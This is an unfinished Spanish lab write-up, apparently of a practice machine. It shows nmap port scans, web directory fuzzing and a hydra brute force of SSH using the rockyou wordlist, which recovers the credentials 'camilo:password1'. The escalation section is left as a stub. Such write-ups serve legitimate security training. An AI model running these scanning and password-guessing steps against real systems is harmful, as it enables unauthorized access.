#tag

![](../../../Images/Pasted%20image%2020241008071813.png)
# Enumeración

## Nmap

El escaneo de **nmap** nos enseña la existencia de un servicio SSH i un servicio HTTP funcionando.

```
> nmap --open --min-rate 10000 -Pn -n -oN scans/allTCPPorts $target

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 17:03 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000013s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

```
> nmap -oN scans/targetedTCPPorts -sCV $target -p 22,80                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 17:04 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```

## Website (80 TCP Port)

En el sitio web nos encontramos con un ...

```
> dirscan http://172.17.0.2/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [21/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 2ms]
:: Progress: [175/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0:: Progress: [1405/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: :: Progress: [2844/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: :: Progress: [4200/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 4ms]
:: Progress: [4255/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:                         [Status: 200, Size: 74, Words: 15, Lines: 2, Duration: 1ms]
:: Progress: [4306/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: :: Progress: [5660/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: :: Progress: [7235/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: :: Progress: [8627/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: :: Progress: [10055/30000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [11621/30000] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:01] :: Err:: Progress: [12953/30000] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:01] :: Err:: Progress: [14465/30000] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:01] :: Err:: Progress: [15970/30000] :: Job [1/1] :: 11764 req/sec :: Duration: [0:00:01] :: Err:: Progress: [17429/30000] :: Job [1/1] :: 10526 req/sec :: Duration: [0:00:01] :: Err:: Progress: [18958/30000] :: Job [1/1] :: 14285 req/sec :: Duration: [0:00:01] :: Err:: Progress: [20513/30000] :: Job [1/1] :: 14285 req/sec :: Duration: [0:00:01] :: Err:: Progress: [21986/30000] :: Job [1/1] :: 14285 req/sec :: Duration: [0:00:01] :: Err:: Progress: [23597/30000] :: Job [1/1] :: 16666 req/sec :: Duration: [0:00:02] :: Err:: Progress: [25164/30000] :: Job [1/1] :: 14285 req/sec :: Duration: [0:00:02] :: Err:: Progress: [26644/30000] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:02] :: Err:: Progress: [28083/30000] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:02] :: Err:: Progress: [29514/30000] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:02] :: Err:: Progress: [30000/30000] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:02] :: Err:: Progress: [30000/30000] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:02] :: Errors: 2 ::
```


![](../../../Images/Pasted%20image%2020241008170742.png)


## SSH (22 TCP Port)




# Usuario XXX


```
> hydra -l camilo -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 17:07:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 17:08:02
```




# Escalada de privilegios

Haciendo una investigación a nivel local del sistema ...